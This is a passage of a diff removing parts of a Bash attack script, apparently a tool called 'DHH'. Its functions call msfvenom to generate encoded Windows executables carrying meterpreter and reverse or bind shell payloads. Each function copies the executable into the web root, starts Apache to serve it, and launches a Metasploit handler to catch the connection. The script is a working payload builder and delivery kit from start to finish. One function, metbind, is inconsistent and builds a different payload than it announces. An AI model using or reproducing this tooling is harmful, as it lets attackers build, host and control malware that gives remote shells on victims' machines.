-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [exe] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED windows/meterpreter/reverse_http $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-wind=.exe
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$wind
-cp $name$wind /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/meterpreter/reverse_http; exploit -j'"
-
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-exie () {
-exie 
- 
-}
-
-winhttps () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [exe] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED windows/meterpreter/reverse_https $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-wind=.exe
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$wind
-cp $name$wind /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/meterpreter/reverse_https; exploit -j'"
-
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-sheel () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [exe] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED windows/shell/reverse_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-wind=.exe
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/shell/reverse_tcp -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$wind
-cp $name$wind /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/shell/reverse_tcp; exploit -j'"
-
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-sh_x64 () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [exe] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"    
-echo "$BLUE PAYLOAD    $GREEN:>$RED windows/x64/shell/reverse_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-wind=.exe
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/x64/shell/reverse_tcp -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$wind
-cp $name$wind /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/x64/shell/reverse_tcp; exploit -j'"
-
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-sh_ipv6 () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [exe] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                        
-echo "$BLUE PAYLOAD    $GREEN:>$RED windows/shell/reverse_ipv6_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-wind=.exe
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/shell/reverse_ipv6_tcp -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$wind
-cp $name$wind /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/shell/reverse_ipv6_tcp; exploit -j'"
-
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-sh_non () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [exe] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                            
-echo "$BLUE PAYLOAD    $GREEN:>$RED windows/shell/reverse_nonx_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-wind=.exe
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/shell/reverse_nonx_tcp -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$wind
-cp $name$wind /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/shell/reverse_nonx_tcp; exploit -j'"
-
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-sh_ord () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [exe] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                             
-echo "$BLUE PAYLOAD    $GREEN:>$RED windows/shell/reverse_ord_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-wind=.exe
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/shell/reverse_ord_tcp -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$wind
-cp $name$wind /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/shell/reverse_ord_tcp; exploit -j'"
-
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-sh_allports () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [exe] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                            
-echo "$BLUE PAYLOAD    $GREEN:>$RED windows/shell/reverse_tcp_allports $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-wind=.exe
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/shell/reverse_tcp_allports -e x86/shikata_ga_nai -f exe LHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$wind
-cp $name$wind /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7 
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD windows/shell/reverse_tcp_allports; exploit -j'"
-
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-metbind () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter KHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "KHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [exe] Final Config:       "
-echo "==================================="
-echo "$BLUE KHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED windows/meterpreter/bind_hidden_ipknock_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-wind=.exe
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p windows/shell/reverse_tcp_allports -e x86/shikata_ga_nai -f exe KHOST=$host LPORT=$port > $hh/Desktop/Output/$name$wind"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$wind
-cp $name$wind /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set KHOST $host; set LPORT $port; set PAYLOAD windows/meterpreter/bind_hidden_ipknock_tcp; exploit -j'"
-
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-
-function wine {
-clear
-
-cat << !
-
-$RED
-
-┌─┐─┐ ┬┌─┐┬  ┌─┐┬┌┬┐  ┬ ┬┬┌┐┌┌┬┐┌─┐┬ ┬┌─┐
-├┤ ┌┴┬┘├─┘│  │ ││ │   │││││││ │││ ││││└─┐
-└─┘┴ └─┴  ┴─┘└─┘┴ ┴   └┴┘┴┘└┘─┴┘└─┘└┴┘└─┘$BLUE
-
